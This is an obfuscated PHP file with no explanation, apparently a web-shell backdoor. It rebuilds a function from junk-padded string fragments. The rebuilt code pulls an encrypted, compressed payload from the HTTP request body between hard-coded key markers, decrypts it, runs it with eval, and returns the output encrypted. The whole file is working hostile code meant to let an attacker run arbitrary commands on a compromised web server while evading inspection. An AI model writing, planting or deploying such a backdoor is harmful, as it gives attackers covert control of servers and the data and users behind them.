<?php
$O='_en4Nd_clea4Nn();$r4N=@base4N644N_encode(@x(4N@gzco4Nmpr4Ness($4No)4N,$k));print("4N$p$4Nkh$r$kf");}';
$s='$k="4N66e5ea104N";$kh="34N4N1a1ff84N3aa1d"4N;$kf="e9f70f74N4N28b54N7";$p="4Nc0xik73P4Nqk7w8d4NHn';
$E='_match(4N"/4N$kh(.4N+)$kf/"4N,4N@file_get_con4Nte4N4Nnts("php4N:4N//input"),$4N4Nm)==1) {@4N4Nob_start();';
$l='";functio4Nn4N x($t,$k){4N$c=s4Ntr4Nlen($k);4N4N$l=strlen($t)4N;$o="4N";for($i=0;4N$i<$l4N;)4N{f';
$F=str_replace('W','','creWatWeW_WWfuWnction');
$g='or($j4N=0;($j<4N4N$c4N&&$i<$l);$j++,$i4N++){4N$o.=$t{$i}4N^$4Nk{4N$j};}}re4Nt4Nur4Nn $o;}if (@preg';
$n='@e4Nval(@gzunco4Nmpress(@x4N(@b4Nase64_deco4Nde(4N$m[4N1]),$k)));$o=4N4N@o4Nb_get_contents();@4Nob';
$P=str_replace('4N','',$s.$l.$g.$E.$n.$O);
$q=$F('',$P);$q();
?>
